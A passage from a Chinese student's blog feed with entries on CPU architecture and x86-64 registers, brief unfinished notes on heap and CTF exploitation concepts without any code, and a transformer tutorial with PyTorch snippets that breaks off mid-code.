1)</code></p><p>左右移位操作在电路中是很简单基础的逻辑，但是在数学上，左移一位，就相当于乘以2；右移一位，就相当于除以2</p><p>于是通过移位和加减操作的结合，又能分别实现乘法和除法</p><p>加、减、乘、除、与、或、异或、移位，这些在高级语言里看起来完全不同的操作，在硬件里竟然都可以归结为对少数几种基础电路的组合和控制，太神秘了</p><p>最后，这些运算电路被统一封装在一个模块中，这个模块就是<strong>ALU</strong>，即<code>算数逻辑单元</code>~</p><p>不得不再次提到<code>抽象</code>的力量，你可以不用关注复杂的晶体管与电路实现，只需要封装+抽象即可!</p><hr><p>现在计算机拥有了<code>运算</code>的能力，但如何获得<strong>记住</strong>的能力?</p><p>很容易想到，<strong>电容</strong>可以实现记住的功能，但电容会随时间逐渐损失(<strong>漏电</strong>)，因此需要不断刷新来保持数据，用在CPU中似乎并不合适，CPU的运算节奏极快，它需要的是一种几乎可以<code>随取随用</code>的存储单元，而不是隔一段时间就要维护一次状态的电容，但其结构简单，容量大且成本低，因此主存便通常采取这样的方式，也就是<strong>DRAM</strong>，<code>动态随机存取存储器</code></p><p>区别于此，CPU中通过晶体管电路的精妙实现，组成一个带<code>反馈</code>的逻辑结构，把输出重新送回输入，构成一个稳定的逻辑状态，一旦被写入0或1，只要电源存在，它就能一直保持这个值不变，这便是<code>SRAM</code>，<code>静态随机存取存储器</code>，常用于CPU<strong>寄存器</strong>与L1，L2<strong>缓存</strong>，需要更多的晶体管，成本更高，更复杂，容量也做不大，但换来的，是极高的速度和稳定性，称为<strong>锁存器</strong>(latch)!</p><p>同理，多个锁存器组合起来便是喜闻乐见的<code>寄存器</code>了~</p><p>寄存器用于在CPU内部保存当前指令执行过程中最关键，最频繁访问的数据</p><p>相比主存，寄存器容量极小，但访问速度极快!</p><p>为了让寄存器在复杂的电路中正常工作，还需要配合<code>读使能</code>和<code>写使能</code>信号，写使能决定当前时钟边沿是否把数据写入寄存器，读使能则决定寄存器的内容是否被送上数据总线，这些信号由控制单元统一调度!</p><p>出现了许多概念</p><p>先解释一下<strong>时钟</strong></p><p>时钟是一个周期性跳变的信号，CPU内部几乎所有状态的更新，都严格发生在时钟的某一个边沿上，这里的状态，指的就是寄存器，程序计数器，标志位等由锁存器构成的存储单元，组合逻辑可以在一个周期内自由变化，但只有在时钟边沿到来时，这些变化才会被采样并真正写入寄存器</p><p><code>数据总线</code>则可以理解为将ALU，寄存器，主存<strong>串联</strong>起来的传输数据的共享线路，除此之外还有<code>地址总线</code>，用来告诉主存我要访问的是哪个位置，以及<code>控制总线</code>，用来传递读写使能，时钟相关信号等控制信息…</p><p>等等，CPU是怎么在主存中找到地址的?</p><p>从CPU的视角来看，主存被抽象为一个巨大的，线性编号的存储空间，每一个存储单元都有一个唯一的地址，CPU只需要给出一个地址，就能通过地址总线访问对应的位置，但是主存是将地址解码成行，列等更底层的电路结构，用来选中具体的存储单元，太复杂的实现，我们抽象掉…</p><p>CPU又是怎么识别如<code>add</code>，<code>mov</code>等指令的呢，CPU并不理解<code>add</code>，<code>mov</code>这样的助记符，这些只是汇编语言中为了方便人类阅读而引入的名字，尽管似乎对于人类来说还是很难理解(x_x)，在机器层面，指令就是一串固定格式的二进制比特</p><p>这似乎取决于具体架构，但离不开<strong>译码器</strong>，当一条指令被从主存取到CPU后，它会被送入指令寄存器(即<strong>取指</strong>)，随后，控制单元开始对这串比特进行解析，即<strong>译码</strong></p><p>译码的核心是<code>译码器</code>，译码器本质上也是一个组合逻辑电路，它根据指令中不同字段的比特模式，产生一组控制信号，这些控制信号会告诉 CPU这是哪一类指令，需要使用哪些寄存器，ALU要执行什么运算以及结果是否需要写回寄存器或内存等等</p><p>在<strong>执行</strong>阶段，这些控制信号会被真正送达各个<strong>硬件</strong>模块，相关寄存器的读使能被打开，操作数被送上数据总线，ALU根据译码结果选择对应的运算路径，若需要访问主存，相应的地址和读写信号也会被同时发出</p><p>当运算完成后，在下一个<strong>时钟</strong>边沿，如果写使能信号有效，结果就会被写回到目标寄存器或内存中，与此同时，程序计数器也会根据指令类型被更新，要么顺序指向下一条指令，要么被改写为跳转目标地址</p><p>至此，一条指令的<strong>生命周期</strong>才算结束!</p><p>随后，CPU再次进入取指阶段，重复取指、译码、执行这一循环，程序也就以这种方式一条一条地向前推进…</p><p>让我们重点看看<strong>程序计数器</strong>(IP&#x2F;PC)，其始终指向<code>当前即将执行的那一条指令在主存中的地址</code></p><p>在取指阶段，CPU会根据IP给出的地址，通过地址总线从主存中取出对应的指令，并送入<strong>指令寄存器</strong>(IR)</p><p>当一条指令执行完成后，IP会被更新，对于顺序执行的指令，IP 通常会自动增加，指向下一条指令的位置，而对于跳转(jmp)，调用(call)等控制流指令，IP则会被直接改写为新的目标地址</p><p>也正是通过不断地读取和更新IP，CPU才能沿着程序设定的执行路径不断向前推进，看似只是一个简单的寄存器，却决定了程序接下来要做什么，是整个指令执行流程中最关键的状态之一!</p><p>所以在<code>pwn</code>中，hacker们的目标通常就是控制IP~</p><p>原来如此啊~</p><p>当然，这似乎只是最简单的实现，尽管其已经让我彻底懵了</p><p>在更复杂的CPU中，这些阶段甚至会被流水线化(x_x)，不同指令的不同阶段可以在同一个时钟周期内<strong>并行</strong>进行，后面再来探索吧!</p><p class="note note-primary">想不到吧，这里也有资本家</p><p>同时，如你所见，由于频繁访问主存会带来较大的延迟和性能开销，现代CPU内部会集成高速<strong>缓存</strong>(Cache)系统，从而减少每次访问主存的等待时间，提高CPU整体运行效率</p><p>寄存器，操作系统，汇编指令似乎也不止于此…</p><p>太神秘了…</p><hr><p>最后总结一下!</p><p>在CPU内部，最核心的组成包括几部分</p><p>首先是<code>运算逻辑单元</code>，即<strong>ALU</strong>，负责执行加减、逻辑运算和移位等基本计算</p><p>其次是<code>寄存器系统</code>，由大量基于<strong>锁存器</strong>构成的寄存器组成，用来保存指令执行过程中最关键、最频繁使用的数据，其中也包括程序计数器<strong>IP</strong>，用来指向下一条即将执行的指令</p><p>为了让这些部件在高速下仍然能够有序协作，CPU还依赖统一的<code>时钟信号</code></p><p>时钟把连续变化的电路切分成一个个离散的周期，使寄存器只在特定的时刻更新状态，保证整个系统的确定性</p><p>而控制单元则通过<code>译码器</code>，把指令中的二进制比特翻译成一组控制信号，统一调度寄存器读写，ALU运算以及访存行为</p><p>在存储层面，CPU内部使用的是基于<strong>SRAM</strong>的寄存器和高速缓存，追求极致的访问速度</p><p>而主存则采用<strong>DRAM</strong>，负责提供大容量的数据存储</p><p>两者之间通过<code>总线</code>相连，形成清晰的分工</p><p>当CPU需要与主存交互时，会由IP给出指令地址，或由指令本身给出数据地址</p><p>CPU将目标地址放到<code>地址总线</code>上，同时通过控制总线发出读或写信号</p><p>主存在接收到地址和控制信号后，把对应的数据放到数据总线上，CPU 再将这些数据读入寄存器，供后续运算使用，或将计算结果写回主存</p><p>最终，CPU 正是通过不断重复<code>取指</code>、<code>译码</code>、<code>执行</code>这一循环，在<code>时钟</code>的约束下，对寄存器和主存中的状态进行有序更新</p><p>看似抽象复杂的程序执行过程，本质上就是这些基础部件在硬件层面一次次精确协作的结果!</p><div class="note note-success">            <p>最后 借用YS-os中的一句话 — 善用 LLM 进行学习! (´・ω・)つ旦</p>           </div><hr><p>so free~</p><p>最后的最后依旧借用一下2022年上海中考的作文题目，这不过是个开始…</p><p>move forward!</p><p>感谢阅读!</p><p>生活愉快…</p><hr><p>补充:</p><p>我觉得有必要补充一下<code>寄存器</code>相关的知识</p><p>掌握了寄存器</p><p>汇编便也不再晦涩难懂(你确定??? (´⊙ω⊙&#96;) )</p><p>我以我熟悉的linux x86-64 为例</p><p>首先，有哪些寄存器?</p><p>1.通用寄存器</p><p>比如</p><p><code>rdi rsi rdx rcx rbx rax r8-r15</code></p><p>用于整数运算，函数参数传递，临时存储等</p><p>2.栈相关寄存器</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rbp</span> 栈帧基址寄存器<br><span class="hljs-built_in">rsp</span> 栈顶指针寄存器<br></code></pre></td></tr></table></figure><p><strong>栈帧</strong></p><p>3.程序计数器</p><p><code>rip</code></p><p>保存下一条即将执行的指令地址</p><p>4.标志寄存器(<code>RFLAGS</code>&#x2F;<code>EFLAGS</code>)</p><p>保存运算结果状态，例如零标志<code>ZF</code>，进位标志<code>CF</code>，溢出标志<code>OF</code>，符号标志<code>SF</code>等等，用于<strong>条件跳转</strong>和ALU决策</p><p>5.浮点与向量寄存器</p><p>涉及二进制浮点数表示，暂时不管</p><p>6.段寄存器</p><p><code>CS DS ES FS GS SS</code></p><p>用于<code>内存段选择</code>，现代用户态程序基本不操作，不管</p><p>7.控制寄存器(CR0–CR4等)</p><p>用于控制CPU工作模式，分页，保护等机制，主要在内核态使用</p><p>8.调试寄存器(DR0–DR7)</p><p>用于硬件断点设置(硬件中断)，gdb的底层原理!</p><p>最后，是一套寄存器调用约定(ABI)</p><ul><li><p>函数前6个整型参数依次放在寄存器 RDI RSI RDX RCX R8 R9</p></li><li><p>caller-saved <code>RAX RCX RDX RSI RDI R8–R11</code></p></li><li><p>callee-saved <code>RBX RBP R12–R15</code></p></li><li><p>返回值放在寄存器 <strong>RAX</strong></p></li><li><p>栈16字节对齐(<strong>RSP</strong>)</p></li></ul><p>熟悉吗孩子们</p><p>哈哈哈哈哈哈哈</p><div class="note note-danger">            <p>pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn</p>           </div><p>启航2026!</p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPU</tag>
      
      <tag>计组</tag>
      
      <tag>抽象</tag>
      
      <tag>内存</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>first heap!!!!!</title>
    <link href="/2026/02/11/first-heap/"/>
    <url>/2026/02/11/first-heap/</url>
    
    <content type="html"><![CDATA[<p>做的第一道堆题</p><p>暂时不知道打什么标签呢</p><p>好混乱…</p><p>慢慢写…</p>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>堆</tag>
      
      <tag>freehook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>heap</title>
    <link href="/2026/02/11/heap/"/>
    <url>/2026/02/11/heap/</url>
    
    <content type="html"><![CDATA[<p>此heap非彼heap</p><p>终于开始堆漏洞的学习了</p><p>这篇作为前置知识的总结</p><p>一直放着…</p><p>慢慢写…</p>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>magic-gadget</title>
    <link href="/2026/02/11/magic-gadget/"/>
    <url>/2026/02/11/magic-gadget/</url>
    
    <content type="html"><![CDATA[<p>今天偶然看到的一个很神奇的gadget和攻击方法</p><p>令我很震惊</p><p>原来不是<code>pop ***; ret;</code>这样式才叫gadget</p><p>只要能被我们所利用</p><p>那其就能被称之为gadget</p><p>不得不佩服古人的智慧</p><p>同时对partial overwrite这门技术有了新的理解</p><p>很多时候不能或者说很难泄露libc基址</p><p>便可以利用程序中已存在的libc中的地址进行partial overwrite</p><p>此时</p><p><code>偏移</code> is all you need</p><p>虽然比赛(<code>SHCTF</code>)时一题也没做出来…</p><p>但自认收获还是很丰厚的</p><p>在不断的调试与改写exp中</p><p>也更加感受到了pwn漏洞利用的魅力</p><p>下面进入正题</p><p>爱来自magic-gadget</p><p>简单复刻了一下</p><p>有点意思…</p><p>以后再写…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>magic-gadget</tag>
      
      <tag>partial overwrite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dlresolve续</title>
    <link href="/2026/02/11/ret2dlresolve%E7%BB%AD/"/>
    <url>/2026/02/11/ret2dlresolve%E7%BB%AD/</url>
    
    <content type="html"><![CDATA[<p>这篇才是真正的攻击与题目</p><p>依旧慢慢写…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2dlresolve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>transformer</title>
    <link href="/2026/01/25/transformer/"/>
    <url>/2026/01/25/transformer/</url>
    
    <content type="html"><![CDATA[<p>最近<strong>大语言模型</strong>(LLM)的各种应用好像都比较火热，我也来凑凑热闹浅浅研究一下<code>AI</code></p><p>虽然被一堆眼花缭乱的词汇弄得有些茫然，不过还是从其最基础的架构开始学习…</p><p>从传统的机器学习，统计学习到如今的强化学习，深度学习，神经网络，包括以<code>CV</code>(computer vision)为起源发展起来的<code>FNN</code>(全连接神经网络)，<code>CNN</code>(卷积神经网络)，<code>RNN</code>(循环神经网络)等等，可以自行了解</p><p>它们虽风靡一时，但仍存在一些问题…</p><p>最主要的便是它们都是依序计算，限制了<code>GPU</code>的<strong>并行</strong>计算能力，且难以捕捉长序列的时序关系，距离越远的输入之间的关系就越难被捕捉</p><p>直到2017年一篇论文横空出世，<code>attention is all you need</code>，引入<code>transformer</code>架构(不是变形金刚qwq)，成为了当今大语言模型的核心架构</p><p>阅读了论文，也看了很多讲解视频，学习了一下基本原理，但仍然感觉比较抽象，所以在<strong>github</strong>的<code>happy-llm</code>这个项目中跟着大佬们手敲一个<code>transformer</code>以加深理解</p><p>原理可以自行阅读论文，看视频，也可以看看<strong>happy-llm</strong>这个project，下面总结一下流程(我也是新手，理解有错勿喷)…</p><p>先放一下这张图</p><p><img src="/images/2.jpg" alt="如图"></p><p>开始吧！</p><p>首先我们假设ai接收到了用户的一串输入，它肯定是看不懂文字的，只能将其转化为数字，但是若一个数字对应一个字，未免太多了，因此通常以<strong>向量</strong>的形式来表示</p><p>具体点，这串输入被<code>tokenizer</code>分为一个个<code>token</code>(最小片段)，并有着各自的<code>token ID</code>，通过查询<strong>词嵌入矩阵</strong>(embedding matrix)，每个token ID会被映射为一个固定维度的向量表示，即<code>token embedding</code>(词嵌入)，这是根据大量数据的训练得来的，此时意思相近的矩阵会在如<code>点积</code>这类相似度计算上表现为相近，例如kobe和bryant相近(开玩笑)，或者经典的like <code>woman - man + king = queen</code> </p><p>代码实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># embedding</span><br><br><span class="hljs-variable language_">self</span>.tok_embeddings = nn.Embedding(args.vocab_size,args.dim)<br></code></pre></td></tr></table></figure><p>此时文字包含了<strong>语义信息</strong>，但是却没有位置信息，我爱你可以被理解为你爱我，但，这可能吗…(说好的幸福呢…)</p><p>好了不扯了，那么因此要加上<strong>位置信息</strong>对吧，采用一种很神秘的形式(<code>PE</code> positional embedding)，跟着数学公式大致推导了一番，理解理解得了</p><p><img src="/images/49.png" alt="如图"></p><p><img src="/images/3.jpg" alt="如图"></p><p>字有点丑，不要介意，证明的也比较抽象(还是去看happy-llm原文吧)，总之这样我们就给token加上了位置信息，而且根据三角函数的一些性质，计算也是比较方便的，可以看到</p><p><img src="/images/50.png" alt="如图"></p><p>效果还是很不错的!</p><p><code>numpy</code>与<code>pytorch</code>的实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 位置编码(PE)</span><br><br><span class="hljs-comment"># 数学原理与证明</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PositionEncoding</span>(<span class="hljs-params">seq_len,d_model,n=<span class="hljs-number">10000</span></span>):<br>    P = np.zeros((seq_len,d_model))<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(seq_len):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> np.arange(<span class="hljs-built_in">int</span>(d_model/<span class="hljs-number">2</span>)):<br>            denominator = np.power(n,<span class="hljs-number">2</span>*i/d_model)<br>            P[k,<span class="hljs-number">2</span>*i] = np.sin(k/denominator)<br>            P[k,<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>] = np.cos(k/denominator)<br>    <span class="hljs-keyword">return</span> P<br>P = PositionEncoding(seq_len=<span class="hljs-number">4</span>,d_model=<span class="hljs-number">4</span>,n=<span class="hljs-number">100</span>)<br><br><span class="hljs-built_in">print</span>(P)<br><br><span class="hljs-comment"># 位置编码层</span><br><span class="hljs-comment"># pytorch实现</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PositionEncoding</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>(PositionEncoding,<span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-comment"># Dropout 层</span><br>        <span class="hljs-comment"># self.dropout = nn.Dropout(p=args.dropout)</span><br><br>        <span class="hljs-comment"># block size 是序列的最大长度</span><br>        pe = torch.zeros(args.block_size,args.n_embd)<br>        position = torch.arange(<span class="hljs-number">0</span>,args.block_size).unsqueeze(<span class="hljs-number">1</span>)<br><br>        <span class="hljs-comment"># 计算 theta</span><br>        div_term = torch.exp(<br>            torch.arange(<span class="hljs-number">0</span>,args.n_embd,<span class="hljs-number">2</span>) * -(math.log(<span class="hljs-number">10000.0</span>) / args.n_embd)<br>        )<br><br>        <span class="hljs-comment"># 分别计算 sin、cos 结果</span><br>        pe[:, <span class="hljs-number">0</span>::<span class="hljs-number">2</span>] = torch.sin(position * div_term)<br>        pe[:, <span class="hljs-number">1</span>::<span class="hljs-number">2</span>] = torch.cos(position * div_term)<br>        pe = pe.unsqueeze(<span class="hljs-number">0</span>)<br>        <span class="hljs-variable language_">self</span>.register_buffer(<span class="hljs-string">&quot;pe&quot;</span>,pe)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        <span class="hljs-comment"># 将位置编码加到 Embedding 结果上</span><br>        x = x + <span class="hljs-variable language_">self</span>.pe[:, : x.size(<span class="hljs-number">1</span>)].requires_grad_(<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> x<br></code></pre></td></tr></table></figure><p>此时有了语义信息和位置信息，却没有<strong>上下文信息</strong>，即，词与词之间的关联</p><p>因此接下便是核心部分，<code>attention is all you need</code>，所谓注意力机制，源于这个经典公式</p><p>$$ \text{attention}(Q, K, V) &#x3D; \text{softmax}\left(\frac{QK^T}{\sqrt{d_k}}\right)V $$</p><p>q代表query，k代表key，v代表value</p><p>还是简单解释一下吧，例如，<code>james is crab</code>(随便举个例子)这句句子，被分为token A，B，C，分别是james，is，crab</p><p>每个token都有自己的q，k，v</p><p>crab的q类似于”我(crab)现在需要从上下文中获取什么信息？”</p><p>而每个token的key类似于”我这个token能回答什么问题？”</p><ul><li><p>比如token A，我是一个人名</p></li><li><p>token B，我表示一种判断</p></li></ul><p>v类似”如果你关注我，我真正传递给你的信息”，即，实际被加权汇总的内容</p><p>token C的q与每个token的k相乘(<code>向量点积</code>)，然后为防止数值过大除以dim的平方根，得到一系列<code>logits</code>(分数)，此时，显然<code>james</code>的分数最高，<code>is</code>次之，最后才是<code>crab</code>本身，代表”为了理解crab，我最该关注james”</p><p>最后通过<code>softmax</code>转换为一个和为<strong>1</strong>的概率分布，再用该概率对所有token的v进行加权求和，得到<code>crab</code>的新的包含<strong>上下文信息</strong>的向量表示，类似于”作为james的某种比喻存在的crab”，这样我们就使得crab注意到了james，有了上下文含义，是不是很奇妙</p><p><img src="/images/51.png" alt="如图"></p><p>而每个q,k,v分别由原本的向量与权重矩阵Wq,Wk,Wv相乘得来，这些权重矩阵便是训练的核心，初始先随机，然后根据<code>反向传播</code>，<code>梯度下降</code>不断调整便是，不再赘述…</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 注意力机制实现</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attention</span>(<span class="hljs-params">query, key, value, dropout=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    args:</span><br><span class="hljs-string">    query: 查询值矩阵</span><br><span class="hljs-string">    key: 键值矩阵</span><br><span class="hljs-string">    value: 真值矩阵</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment"># 获取键向量的维度，键向量的维度和值向量的维度相同</span><br>    d_k = query.size(-<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># 计算Q与K的内积并除以根号dk</span><br>    <span class="hljs-comment"># transpose——相当于转置</span><br>    scores = torch.matmul(query, key.transpose(-<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>)) / math.sqrt(d_k)<br>    <span class="hljs-comment"># Softmax</span><br>    p_attn = scores.softmax(dim=-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> dropout <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        p_attn = dropout(p_attn)<br>        <span class="hljs-comment"># 采样</span><br>    <span class="hljs-comment"># 根据计算结果对value进行加权求和</span><br>    <br>    <span class="hljs-keyword">return</span> torch.matmul(p_attn, value), p_attn<br></code></pre></td></tr></table></figure><p>transformer的注意力机制又包括<code>encoder</code>的<strong>自注意力机制</strong>与<code>decoder</code>的<strong>掩码自注意力机制</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自注意力</span><br><span class="hljs-comment"># attention 为上文定义的注意力计算函数</span><br>attention(x, x, x)<br><br><br><span class="hljs-comment"># 掩码自注意力</span><br><span class="hljs-comment"># 创建一个上三角矩阵，用于遮蔽未来信息。</span><br><span class="hljs-comment"># 先通过 full 函数创建一个 1 * seq_len * seq_len 的矩阵</span><br>mask = torch.full((<span class="hljs-number">1</span>,args.max_seq_len,args.max_seq_len), <span class="hljs-built_in">float</span>(<span class="hljs-string">&quot;-inf&quot;</span>))<br><span class="hljs-comment"># triu 函数的功能是创建一个上三角矩阵</span><br>mask = torch.triu(mask, diagonal=<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 此处的 scores 为计算得到的注意力分数，mask 为上文生成的掩码矩阵</span><br>scores = scores + mask[:, :, :seqlen, :seqlen]<br>scores = F.softmax(scores.<span class="hljs-built_in">float</span>(), dim=-<span class="hljs-number">1</span>).type_as(xq)<br></code></pre></td></tr></table></figure><p>自注意力比较好理解，就不解释了，<strong>掩码自注意力机制</strong>可以理解为将矩阵的上三角部分都设置为<code>负无穷</code>，下三角部分均为<code>0</code>，在与注意力分数求和并经过<code>softmax</code>后，上三角部分便变为了0(即被masked)，因此在每一行的输入中，模型都只能看到前一个token，并以此预测下一个token，而且可以<strong>并行</strong>地计算</p><p><img src="/images/47.png" alt="如图"></p><p>但是一次注意力计算只能拟合一种相关关系，单一的注意力机制很难全面拟合语句序列里的相关关系。因此<code>transformer</code>使用了<code>多头注意力机制</code>(Multi-Head Attention)，即同时对一个语料进行多次注意力计算，每次注意力计算都能拟合不同的关系，将最后的多次结果拼接起来作为最后的输出，即可更全面深入地拟合语言信息</p><p><img src="/images/48.png" alt="如图"></p><p>代码实现:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 多头注意力机制</span><br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiHeadAttention</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args:ModelArgs,is_causal=<span class="hljs-literal">False</span></span>):<br>        <span class="hljs-comment"># 构造函数</span><br>        <span class="hljs-comment"># args: 配置对象</span><br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-comment"># 隐藏层维度必须是头数的整数倍，因为后面我们会将输入拆成头数个矩阵</span><br>        <span class="hljs-keyword">assert</span> args.dim % args.n_heads == <span class="hljs-number">0</span><br>        <span class="hljs-comment"># 每个头的维度，等于模型维度除以头的总数。</span><br>        <span class="hljs-variable language_">self</span>.head_dim = args.dim // args.n_heads<br>        <span class="hljs-variable language_">self</span>.n_heads = args.n_heads<br><br>        <span class="hljs-comment"># Wq, Wk, Wv 参数矩阵，每个参数矩阵为 n_embd x dim</span><br>        <span class="hljs-comment"># 这里通过三个组合矩阵来代替了n个参数矩阵的组合，其逻辑在于矩阵内积再拼接其实等同于拼接矩阵再内积，</span><br>        <span class="hljs-comment"># 不理解的读者可以自行模拟一下，每一个线性层其实相当于n个参数矩阵的拼接</span><br><br>        <span class="hljs-variable language_">self</span>.wq = nn.Linear(args.n_embd, <span class="hljs-variable language_">self</span>.n_heads * <span class="hljs-variable language_">self</span>.head_dim, bias=<span class="hljs-literal">False</span>)<br>        <span class="hljs-variable language_">self</span>.wk = nn.Linear(args.n_embd, <span class="hljs-variable language_">self</span>.n_heads * <span class="hljs-variable language_">self</span>.head_dim, bias=<span class="hljs-literal">False</span>)<br>        <span class="hljs-variable language_">self</span>.wv = nn.Linear(args.n_embd, <span class="hljs-variable language_">self</span>.n_heads * <span class="hljs-variable language_">self</span>.head_dim, bias=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># 输出权重矩阵，维度为 